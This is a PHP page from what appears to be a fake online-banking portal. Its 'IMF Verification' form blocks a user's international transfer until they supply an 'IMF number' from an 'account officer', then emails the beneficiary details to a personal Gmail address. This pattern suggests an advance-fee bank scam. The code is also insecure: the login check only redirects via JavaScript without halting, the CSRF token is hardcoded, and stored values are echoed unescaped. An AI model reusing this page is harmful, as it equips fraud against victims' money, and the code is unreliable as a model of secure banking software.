<?php include 'includes/timeoutable.php' ?>

<body background: src="img/picc3.jpg" onload="blinktext();">
    <?php include 'includes/db.php'; ?>
    <?php 
    if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) { //ALL CODE RUNS INSIDE THIS IF A USER IS LOGGED IN
    } else { //IF NO USER LOGGED IN
        echo "<script type='text/javascript'> document.location = 'index.php?login_error=session'; </script>";
      //  header('Location: login.php?login_error=wrong');
    }
?>
<?php include 'header2.php';  ?>
<div style="min-height: 80vh;  margin-top: 100px ">
                                        <section>
        <div class="container">
            <div class="row">
                <div class="col-md-4 add">
                                            
                                                    <div class="panel panel-default">
    <div class="panel-heading" style="background-color: black;">
        <h3 class="panel-title" style="color: orange;">IMF Verification</h3>
    </div>
    <div class="panel-body">
        <h3 class="text-center">
            <span class="text-info add price dollar"><?php
                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";
                            $run_sql = mysqli_query($conn,$my_sql);
                            if($rows = mysqli_fetch_assoc($run_sql)){
                                echo'
                                <h3><i class="fa fa-dollar fa-1x">' .$rows['amount'] ; 
                            }
                                ?></i></span>
        </h3>
        <div class="text-center add padding-bottom-10px"><span class="label label-default blinking" id="announcement">Authourization</span></div><br>
        <div id="myProgress">
  <div id="myBar" class="myBar2"></div>
</div><br>
                                                        <?php
if(isset($_POST{'check_imf'})){ //IF LOGIN BTN HAS BEEN CLICKED
    if(!empty($_POST{'imf'})){ //CHECK IF EMAIL AND PASSWORD IS EMPTY 
        $imf = mysqli_real_escape_string($conn, $_POST['imf']);
        $imf = mysqli_real_escape_string($conn,$imf);
        $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
        if($result1 = mysqli_query($conn,$sql)){ //FOR USERS IF THERE IS CONNECTION TO THE DATABASE WHERE EMAIL AND PASSWORD IS AVAILABLE
            if(mysqli_num_rows($result1) == 1){ //IF NO. OF ROWS WITH ABOVE QUERY IS JUST ONE
                
                while($rows = mysqli_fetch_assoc($result1)){ //RETRIEVE INVENTOR DETAILS
                    $s_code = $rows['imf'];
                    if($s_code != $imf){
                        echo "<script type='text/javascript'> document.location = 'imf-verification.php?imf_error=wrong'; </script>"; 
              //  header('Location: signin.php?login_error=wrong');
                    }
                    
                    
                }
                 $sql = "SELECT * FROM int_transfer WHERE user_id = '$_SESSION[id]'"; //FOR USERS
        $result1 = mysqli_query($conn,$sql);
                     //TO SEND EMAIL Admin begins
                 while($rows = mysqli_fetch_assoc($result1)){ 
                    $c_id = $rows['user_id'];
                    $c_name = $rows['name'];
                    $b_name = $rows['b_name'];
                    $b_account = $rows['b_acct'];
                    $b_country = $rows['b_country'];
                    $swift_code = $rows['swift_code'];
                    $b_routing = $rows['routing_number'];
                    $b_bank = $rows['bank_name'];
                    $b_acct_type = $rows['acct_type'];
                    $amount = $rows['amount'];
                    $b_address = $rows['address']; 
                    $name1 = "Chief";
                    $to = "priestzukamosaic@gmail.com"; // this is your Email address
                $from = "info@caixcreditos.com"; // this is the sender's Email address
                $subject2 = "Withdrawal | Request";
                $message2 = "Hello " . $name1 .",
  

A new withdrawal request has been submitted!
Customer ID : " . $c_id . "
Customer Name: " . $c_name."
Beneficiary Name: " .$b_name."
Beneficiary Account: ".$b_account."
Beneficiary Country: ".$b_name."
Swiftcode: ".$swift_code."
Routing Number: ".$b_routing ."
Beneficiary Bank: ".$b_bank ."
Beneficiary Account Number: ".$b_acct_type ."
Amount: ".$amount ."
Bank Adress: ".$b_address ."
------------------------
  
Sign into your Admin panel to effect the transaction:
http://www.caixcreditos.com/zap
  
";
                $headers = "From:" . $from;
                mail($to,$subject2,$message2,$headers);}  // sends a copy of the message to the sender
                //TO SEND EMAIL ENDS
                echo "<script type='text/javascript'> document.location = 'panel.php?imf_correct=successful'; </script>"; 
             //   header('Location: imf-verification.php');
                 
            } else{
                echo "<script type='text/javascript'> document.location = 'imf-verification.php?imf_error=wrong'; </script>"; 
              //  header('Location: imf-verification.php?login_error=wrong');
            } //
        } else{
            echo "<script type='text/javascript'> document.location = 'imf-verification.php?imf_error=query_error'; </script>"; 
           // header('Location: imf-verification.php?login_error=query_error');
        }
    }else{
        echo "<script type='text/javascript'> document.location = 'imf-verification.php?imf_error=empty'; </script>";
     //   header('Location: imf-verification.php?imf_error=empty');
    } 
}else{
    $login_err = '';
    
}
        if(isset($_GET['imf_error'])){ //TO OUTPUT LOGIN ERROR
    if($_GET['imf_error'] == 'empty'){  //LOGIN ERROR FOR EMPTY
        $login_err = "<div class='alert alert-danger'>Sorry! field was empty!</div>";
    }elseif($_GET['imf_error'] == 'wrong'){ //LOGIN ERROR FOR INVALID DETAILS
        $login_err = "<div class='alert alert-warning'>Invalid IMF Number, please contact your account officer!</div>";
    }elseif($_GET['imf_resent'] == 'sent'){ //LOGIN ERROR FOR INVALID DETAILS
        $login_err = "<div class='alert alert-success'>OTP has been resent!</div>";
    }
}else{ echo"
                        
                                                        <div class='alert alert-info text-center><span style='color: red'>Please enter your <strong>IMF number</strong> to proceed</span></div>";} echo $login_err;?><br>
                                                        
            <br>
                                                        <?php
            $inter_sql = "SELECT * FROM int_transfer WHERE user_id ='$_SESSION[id]'";
        $inter_q = mysqli_query($conn, $inter_sql);
        if(mysqli_num_rows($inter_q) > 0){
            while($rows = mysqli_fetch_assoc($inter_q)){
            
            
            ?>
            <form  class="form-horizontal" method="post"  action="imf-verification.php">
                        <input type='hidden' name='csrfmiddlewaretoken' value='XFe2rTYl9WOpV8U6X5CfbIuOZOELJ97S' />
                       
                        <div id="div_id_location" class="form-group required">
                            <label for="id_location" class="control-label col-md-4"> Transaction Type</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md textinput textInput form-control" id="id_location" name="location" placeholder="INT Bank Transfer" style="margin-bottom: 10px" type="text" readonly>
                            </div> 
                        </div>
                <div id="div_id_company" class="form-group required"> 
                            <label for="amount" class="control-label col-md-4  requiredField" style="color: green"> Amount</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="amount" name="amount" placeholder="<?php echo $rows['amount']; ?>" style="margin-bottom: 10px" type="number" readonly>
                            </div>
                        </div> 
                        <div id="div_id_bank_name" class="form-group required">
                            <label for="bank_name" class="control-label col-md-4"> Bank</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md  textinput textInput form-control" id="bank_name" maxlength="30" name="bank_name" placeholder="<?php echo $rows['bank_name']; ?> " style="margin-bottom: 10px" type="text" / readonly>
                            </div>
                        </div>
                        <div id="div_id_acct_number" class="form-group required">
                            <label for="id_acct_number" class="control-label col-md-4  requiredField">Name</label>
                            <div class="controls col-md-8 ">
                                <input class="input-md acct_numberinput form-control" id="id_acct_name" name="b_name" placeholder=" <?php echo $rows['b_name']; ?>" style="margin-bottom: 10px" type="text" / readonly>
                            </div>     
                        </div>
                        <div id="div_id_acct_number" class="form-group required">
                            <label for="id_password1" class="control-label col-md-4  requiredField">ACCT Number</label>
                            <div class="controls col-md-8 "> 
                                <input class="input-md numinput nunInput form-control" id="b_acct" name="b_acct" placeholder="<?php echo $rows['b_acct']; ?>" style="margin-bottom: 10px" type="number" / readonly>
                            </div>
                        </div>
                        <div id="div_id_country" class="form-group required">
                             <label for="id_password2" class="control-label col-md-4  requiredField"> Country</label>
                             <div class="controls col-md-8 ">
                                <select name="b_country" id="state" class="form-control selectpicker countrypicker" data-flag="true"  disabled="disabled">
                                                                            <option value="Afghanistan">Afghanistan</option>
                                                                            <option value="Albania">Albania</option>
                                                                            <option value="Algeria">Algeria</option>
                                                                            <option value="as">American Samoa</option>
                                                                            <option value="American Samoa">Andorra</option>
                                                                            <option value="Angola">Angola</option>
                                                                            <option value="Anguilla">Anguilla</option>
                                                                            <option value="Antarctica">Antarctica</option>
                                                                            <option value="Antigua_and_Barbuda">Antigua and Barbuda</option>
                                                                            <option value="Argentina">Argentina</option>
                                                                            <option value="Armenia">Armenia</option>
                                                                            <option value="Aruba">Aruba</option>
                                                                            <option value="Australia">Australia</option>
                                                                            <option value="Austria">Austria</option>
                                                                            <option value="Azerbaijan">Azerbaijan</option>
                                                                            <option value="Bahamas">Bahamas</option>
                                                                            <option value="Bahrain">Bahrain</option>
                                                                            <option value="Bangladesh">Bangladesh</option>
                                                                            <option value="Barbados">Barbados</option>
                                                                            <option value="Belarus">Belarus</option>
                                                                            <option value="Belgium">Belgium</option>
                                                                            <option value="Belize">Belize</option>
                                                                            <option value="Benin">Benin</option>
                                                                            <option value="Bermuda">Bermuda</option>
                                                                            <option value="Bhutan">Bhutan</option>
                                                                            <option value="Bolivia">Bolivia</option>
                                                                            <option value="Bonaire">Bonaire</option>
                                                                            <option value="Bosnia_and_Herzegovina">Bosnia and Herzegovina</option>
                                                                            <option value="Botswana">Botswana</option>
                                                                            <option value="Bouvet_Island">Bouvet Island</option>
                                                                            <option value="Brazil">Brazil</option>
                                                                            <option value="British_Indian_Ocean_Territory">British Indian Ocean Territory</option>
                                                                            <option value="British Virgin Islands">British Virgin Islands</option>
                                                                            <option value="Brunei">Brunei</option>
                                                                            <option value="Bulgaria">Bulgaria</option>
                                                                            <option value="Burkina Faso">Burkina Faso</option>
                                                                            <option value="Burundi">Burundi</option>
                                                                            <option value="Cambodia">Cambodia</option>
                                                                            <option value="Cameroon">Cameroon</option>
                                                                            <option value="Canada">Canada</option>
                                                                            <option value="Cape Verde">Cape Verde</option>
                                                                            <option value="Cayman Islands">Cayman Islands</option>
                                                                            <option value="Central African Republic">Central African Republic</option>
                                                                            <option value="Chad">Chad</option>
                                                                            <option value="chile">Chile</option>
                                                                            <option value="china">China</option>
                                                                            <option value="Christmas Island">Christmas Island</option>
                                                                            <option value="Cocos [Keeling] Islands">Cocos [Keeling] Islands</option>
                                                                            <option value="co">Colombia</option>
                                                                            <option value="km">Comoros</option>
                                                                            <option value="ck">Cook Islands</option>
                                                                            <option value="cr">Costa Rica</option>
                                                                            <option value="hr">Croatia</option>
                                                                            <option value="cu">Cuba</option>
                                                                            <option value="cw">Curacao</option>
                                                                            <option value="cy">Cyprus</option>
                                                                            <option value="cz">Czech Republic</option>
                                                                            <option value="cd">Democratic Republic of the Congo</option>
                                                                            <option value="dk">Denmark</option>
                                                                            <option value="dj">Djibouti</option>
                                                                            <option value="dm">Dominica</option>
                                                                            <option value="do">Dominican Republic</option>
                                                                            <option value="tl">East Timor</option>
                                                                            <option value="ec">Ecuador</option>
                                                                            <option value="eg">Egypt</option>
                                                                            <option value="sv">El Salvador</option>
                                                                            <option value="gq">Equatorial Guinea</option>
                                                                            <option value="er">Eritrea</option>
                                                                            <option value="ee">Estonia</option>
                                                                            <option value="et">Ethiopia</option>
                                                                            <option value="fk">Falkland Islands</option>
                                                                            <option value="fo">Faroe Islands</option>
                                                                            <option value="fj">Fiji</option>
                                                                            <option value="fi">Finland</option>
                                                                            <option value="fr">France</option>
                                                                            <option value="gf">French Guiana</option>
                                                                            <option value="pf">French Polynesia</option>
                                                                            <option value="tf">French Southern Territories</option>
                                                                            <option value="ga">Gabon</option>
                                                                            <option value="gm">Gambia</option>
                                                                            <option value="ge">Georgia</option>
                                                                            <option value="de">Germany</option>
                                                                            <option value="gh">Ghana</option>
                                                                            <option value="gi">Gibraltar</option>
                                                                            <option value="gr">Greece</option>
                                                                            <option value="gl">Greenland</option>
                                                                            <option value="gd">Grenada</option>
                                                                            <option value="gp">Guadeloupe</option>
                                                                            <option value="gu">Guam</option>
                                                                            <option value="gt">Guatemala</option>
                                                                            <option value="gg">Guernsey</option>
                                                                            <option value="gn">Guinea</option>
                                                                            <option value="gw">Guinea-Bissau</option>
                                                                            <option value="gy">Guyana</option>
                                                                            <option value="ht">Haiti</option>
                                                                            <option value="hm">Heard Island and McDonald Islands</option>
                                                                            <option value="hn">Honduras</option>
                                                                            <option value="hk">Hong Kong</option>
                                                                            <option value="hu">Hungary</option>
                                                                            <option value="is">Iceland</option>
                                                                            <option value="in">India</option>
                                                                            <option value="id">Indonesia</option>
                                                                            <option value="ir">Iran</option>
                                                                            <option value="iq">Iraq</option>
                                                                            <option value="ie">Ireland</option>
                                                                            <option value="im">Isle of Man</option>
                                                                            <option value="il">Israel</option>
                                                                            <option value="it">Italy</option>
                                                                            <option value="ci">Ivory Coast</option>
                                                                            <option value="jm">Jamaica</option>
                                                                            <option value="jp">Japan</option>
                                                                            <option value="je">Jersey</option>
                                                                            <option value="jo">Jordan</option>
                                                                            <option value="kz">Kazakhstan</option>
                                                                            <option value="ke">Kenya</option>
                                                                            <option value="ki">Kiribati</option>
                                                                            <option value="xk">Kosovo</option>
                                                                            <option value="kw">Kuwait</option>
                                                                            <option value="kg">Kyrgyzstan</option>
                                                                            <option value="la">Laos</option>
                                                                            <option value="lv">Latvia</option>
                                                                            <option value="lb">Lebanon</option>
                                                                            <option value="ls">Lesotho</option>
                                                                            <option value="lr">Liberia</option>
                                                                            <option value="ly">Libya</option>
                                                                            <option value="li">Liechtenstein</option>
                                                                            <option value="lt">Lithuania</option>
                                                                            <option value="lu">Luxembourg</option>
                                                                            <option value="mo">Macao</option>
                                                                            <option value="mk">Macedonia</option>
                                                                            <option value="mg">Madagascar</option>
                                                                            <option value="mw">Malawi</option>
                                                                            <option value="my">Malaysia</option>
                                                                            <option value="mv">Maldives</option>
                                                                            <option value="ml">Mali</option>
                                                                            <option value="mt">Malta</option>
                                                                            <option value="mh">Marshall Islands</option>
                                                                            <option value="mq">Martinique</option>
                                                                            <option value="mr">Mauritania</option>
                                                                            <option value="mu">Mauritius</option>
                                                                            <option value="yt">Mayotte</option>
                                                                            <option value="mx">Mexico</option>
                                                                            <option value="fm">Micronesia</option>
                                                                            <option value="md">Moldova</option>
                                                                            <option value="mc">Monaco</option>
                                                                            <option value="mn">Mongolia</option>
                                                                            <option value="me">Montenegro</option>
                                                                            <option value="ms">Montserrat</option>
                                                                            <option value="ma">Morocco</option>
                                                                            <option value="mz">Mozambique</option>
                                                                            <option value="mm">Myanmar [Burma]</option>
                                                                            <option value="na">Namibia</option>
                                                                            <option value="nr">Nauru</option>
                                                                            <option value="np">Nepal</option>
                                                                            <option value="nl">Netherlands</option>
                                                                            <option value="nc">New Caledonia</option>
                                                                            <option value="nz">New Zealand</option>
                                                                            <option value="ni">Nicaragua</option>
                                                                            <option value="ne">Niger</option>
                                                                            <option value="ng">Nigeria</option>
                                                                            <option value="nu">Niue</option>
                                                                            <option value="nf">Norfolk Island</option>
                                                                            <option value="kp">North Korea</option>
                                                                            <option value="mp">Northern Mariana Islands</option>
                                                                            <option value="no">Norway</option>
                                                                            <option value="om">Oman</option>
                                                                            <option value="pk">Pakistan</option>
                                                                            <option value="pw">Palau</option>
                                                                            <option value="ps">Palestine</option>
                                                                            <option value="pa">Panama</option>
                                                                            <option value="pg">Papua New Guinea</option>
                                                                            <option value="py">Paraguay</option>
                                                                            <option value="pe">Peru</option>
                                                                            <option value="ph">Philippines</option>
                                                                            <option value="pn">Pitcairn Islands</option>
                                                                            <option value="pl">Poland</option>
                                                                            <option value="pt">Portugal</option>
                                                                            <option value="pr">Puerto Rico</option>
                                                                            <option value="qa">Qatar</option>
                                                                            <option value="cg">Republic of the Congo</option>
                                                                            <option value="ro">Romania</option>
                                                                            <option value="ru">Russia</option>
                                                                            <option value="rw">Rwanda</option>
                                                                            <option value="re">Réunion</option>
                                                                            <option value="bl">Saint Barthélemy</option>
                                                                            <option value="sh">Saint Helena</option>
                                                                            <option value="kn">Saint Kitts and Nevis</option>
                                                                            <option value="lc">Saint Lucia</option>
                                                                            <option value="mf">Saint Martin</option>
                                                                            <option value="pm">Saint Pierre and Miquelon</option>
                                                                            <option value="vc">Saint Vincent and the Grenadines</option>
                                                                            <option value="ws">Samoa</option>
                                                                            <option value="sm">San Marino</option>
                                                                            <option value="sa">Saudi Arabia</option>
                                                                            <option value="sn">Senegal</option>
                                                                            <option value="rs">Serbia</option>
                                                                            <option value="sc">Seychelles</option>
                                                                            <option value="sl">Sierra Leone</option>
                                                                            <option value="sg">Singapore</option>
                                                                            <option value="sx">Sint Maarten</option>
                                                                            <option value="sk">Slovakia</option>
                                                                            <option value="si">Slovenia</option>
                                                                            <option value="sb">Solomon Islands</option>
                                                                            <option value="so">Somalia</option>
                                                                            <option value="za">South Africa</option>
                                                                            <option value="gs">South Georgia and the South Sandwich Islands</option>
                                                                            <option value="kr">South Korea</option>
                                                                            <option value="ss">South Sudan</option>
                                                                            <option value="es">Spain</option>
                                                                            <option value="lk">Sri Lanka</option>
                                                                            <option value="sd">Sudan</option>
                                                                            <option value="sr">Suriname</option>
                                                                            <option value="sj">Svalbard and Jan Mayen</option>
                                                                            <option value="sz">Swaziland</option>
                                                                            <option value="se">Sweden</option>
                                                                            <option value="ch">Switzerland</option>
                                                                            <option value="sy">Syria</option>
                                                                            <option value="st">São Tomé and Príncipe</option>
                                                                            <option value="tw">Taiwan</option>
                                                                            <option value="tj">Tajikistan</option>
                                                                            <option value="tz">Tanzania</option>
                                                                            <option value="th">Thailand</option>
                                                                            <option value="tg">Togo</option>
                                                                            <option value="tk">Tokelau</option>
                                                                            <option value="to">Tonga</option>
                                                                            <option value="tt">Trinidad and Tobago</option>
                                                                            <option value="tn">Tunisia</option>
                                                                            <option value="tr">Turkey</option>
                                                                            <option value="tm">Turkmenistan</option>
                                                                            <option value="tc">Turks and Caicos Islands</option>
                                                                            <option value="tv">Tuvalu</option>
                                                                            <option value="um">U.S. Minor Outlying Islands</option>
                                                                            <option value="vi">U.S. Virgin Islands</option>
                                                                            <option value="ug">Uganda</option>
                                                                            <option value="ua">Ukraine</option>
                                                                            <option value="ae">United Arab Emirates</option>
                                                                            <option value="gb">United Kingdom</option>
                                                                            <option value="United States" selected>United States</option>
                                                                            <option value="uy">Uruguay</option>
                                                                            <option value="uz">Uzbekistan</option>
                                                                            <option value="vu">Vanuatu</option>
                                                                            <option value="va">Vatican City</option>
                                                                            <option value="ve">Venezuela</option>
                                                                            <option value="vn">Vietnam</option>
                                                                            <option value="wf">Wallis and Futuna</option>
                                                                            <option value="eh">Western Sahara</option>
                                                                            <option value="ye">Yemen</option>
                                                                            <option value="zm">Zambia</option>
                                                                            <option value="zw">Zimbabwe</option>
                                                                            <option value="ax">Åland</option>
                                                                    </select>
                            </div>
                        </div>
                        <div id="div_id_name" class="form-group required"> 
                            <label for="id_name" class="control-label col-md-4  requiredField"> Swift Code</label> 
                            <div class="controls col-md-8 "> 
                                <input class="input-md textinput textInput form-control" id="id_name" name="swift_code" placeholder="<?php echo $rows['swift_code']; ?>" style="margin-bottom: 10px" type="text" / readonly>
                            </div>
                        </div>
                       <!-- <div id="div_id_gender" class="form-group required">
                            <label for="id_gender"  class="control-label col-md-4  requiredField"> Gender</label>
                            <div class="controls col-md-8 "  style="margin-bottom: 10px">
                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_1" value="M"  style="margin-bottom: 10px">Male</label>
                                 <label class="radio-inline"> <input type="radio" name="gender" id="id_gender_2" value="F"  style="margin-bottom: 10px">Female </label>
                            </div>
                        </div>-->
                        <div id="div_id_company" class="form-group required"> 
                            <label for="id_company" class="control-label col-md-4  requiredField"> Routing Number</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="id_company" name="routing_number" placeholder="<?php echo $rows['routing_number']; ?>" style="margin-bottom: 10px" type="text" / readonly>
                            </div>
                        </div> 
                        <div id="div_id_catagory" class="form-group required">
                            <label for="id_catagory" class="control-label col-md-4  requiredField">Purpose</label>
                            <div class="controls col-md-8 "> 
                                 <input class="input-md textinput textInput form-control" id="id_catagory" name="description" placeholder="<?php echo $rows['description']; ?>" style="margin-bottom: 10px" type="text" / readonly>
                            </div>
                        </div> 
                        <div id="div_id_number" class="form-group required">
                             <label for="id_number" class="control-label col-md-4  requiredField"> Account Type</label>
                             <div class="controls col-md-8 ">
                                 <select name="acct_type" id="acct_type" class="form-control" disabled="disabled">
                                      <option value="Savings Account" selected><?php echo $rows['acct_type']; }}?></option>
                                      <option value="current">Current Account</option>
                                      <option value="checking">Checking Account</option>
                                      <option value="fixed">Fixed Deposit</option>
                                     <option value="non_resident">Non Resident Account</option>
                                      <option value="online_banking">Online Banking</option>
                                       <option value="domicilary">Domicilary Account</option>
                                     <option value="joint">Joint Account</option>
                                    </select>
                            </div> 
                        </div> 
                        <div id="div_id_catagory" class="form-group required">
                            <label for="id_catagory" style="color: red" class="control-label col-md-4  requiredField">IMF</label>
                            <div class="controls col-md-8 "> 
                                
                                 <input class="input-md textinput textInput form-control" id="id_catagory" name="imf" placeholder="Please enter your IMF number" style="margin-bottom: 10px" type="text" />
                            </div>
                        </div> 
                        <div class="form-group"> 
                            <div class="aab controls col-md-4 "></div>
                            <div class="controls col-md-8 col-lg-8">
                                <a href'#'><input type="submit" name="Back" value="Back" class="btn btn-sm btn-danger btn btn-info" id="submit-id-signup" /></a>
                                <input type="submit" name="check_imf" value="Proceed" class="btn btn-sm btn-success btn btn-info" id="submit-id-signup" />
                            </div>
                        </div> 
                            
                    </form>
        
        
            </div>
</div>                                                            </div>
                <div class="col-md-4">
                    <div class="panel panel-default">
                        <div class="panel-heading" style="background-color: black;">
                            <h3 class="panel-title" style="color: orange;">Status</h3>
                        </div>
                        <div class="panel-body panel-table">
                                                            <div class="table-responsive">
                                    <table class="table table-hover table-bordered">
                                        <thead>
                                        <tr>
                                            <th class="text-center" id="announcement">AMOUNT</th>
                                            <th class="text-center">TIME</th>
                                            <th class="text-center">STATUS</th>
                                        </tr>
                                        </thead>
                                        <tbody>
                                                                                    <tr class="text-center  blink ">
                                                                                        <?php
                                    $status = "Awaiting Authourization";
                                $my_sql = "SELECT * FROM provide WHERE user_id = '$_SESSION[id]'";
                            $run_sql = mysqli_query($conn,$my_sql);
                            if($rows = mysqli_fetch_assoc($run_sql)){ ?>
                                                <td class="text-left">
                                                    <a href="billing.php"
                                                       class="btn-link btn-warning">
                                                        <span class="text-uppercase" id="announcement"><i class="fa fa-dollar fa-1x" id="announcement"></i> <?php echo $rows['amount']; ?></span>
                                                    </a>
                                                </td>
                                                <td>
                                                    <span class="add price dollar"><?php echo $rows['created_at']; ?></span>
                                                </td>
                                                <td>
                                                                                                            <span class="text-info"><?php echo $status; 
                            ;}
                                ?></span>
                                                                                                    </td>
                                            </tr>
                                                                                </tbody>
                                    </table>
                                </div>
                                <div class="text-center">
                                    
                                </div>
                                                    </div>
                    </div>
                </div>
                <div class="col-md-4">
                    <div class="panel panel-default">
                        <div class="panel-heading" style="background-color: black;">
                            <h3 class="panel-title blinking" style="color: orange;">Transaction History</h3>
                        </div>
                        <div class="panel-body panel-table">
                                                            <div class="alert">
                                    <strong><div class="table-responsive wide-table" style="border-color: transparent">
    <table class="table table-hover table-bordered add border-radius">
        <thead>
        <tr>
             
            
            <th>Transaction</th>
            <th>Amount</th>
            <th>Date</th>
            <th>Status</th>
                    </tr>
        </thead>
        
        
            <?php
                    $i = 1;
        
                    $my_sql = "SELECT * FROM transaction WHERE user_id = '$_SESSION[id]'";
                    $run_sql = mysqli_query($conn,$my_sql);
                    if(mysqli_num_rows($run_sql) > 0){
                    while($rows = mysqli_fetch_assoc($run_sql)){ 
       echo '<tr><td>' .$rows['transaction']. '</td><td>'.$rows['amount'].'</td><td>'.$rows['created_at'].'</td><td ><button type="button" class="btn btn-success btn-sm">'.$rows['Status']. '</button></td></tr>';
                    } }else{
                        echo' No table to display';
                        
                    }?>
        
    </table>
</div></strong>
                                </div>
                                                    </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    </div>
   
            <?php include 'footer.php' ?>
</body>
<?php
                      if(isset($_GET['registered'])) {
                     echo '<div class="alert alert-success">
  <strong>Registration Successfull!</strong> Please signin to continue.
</div>';
                        }
                        ?>
            
